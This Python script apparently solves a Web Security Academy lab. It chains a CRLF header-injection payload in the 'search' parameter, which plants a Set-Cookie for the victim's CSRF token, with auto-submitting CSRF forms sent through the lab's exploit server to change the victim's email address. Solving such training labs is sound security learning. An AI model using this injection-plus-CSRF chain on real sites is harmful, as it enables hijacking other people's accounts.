from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html, readFile

from urllib.parse import urljoin
from requests import Request


def solve_lab(session):
    session.login("wiener", "peter")
    csrf = session.get_csrf_token("/my-account?id=wiener")

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    # Exploiting the arbitrary header injection vulnerability to set the
    # victim's "csrf" cookie

    params = {"search": f";\r\nSet-Cookie: csrf={csrf}"}
    req = Request("GET", session.url, params=params)
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com", "csrf": csrf},
    )
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
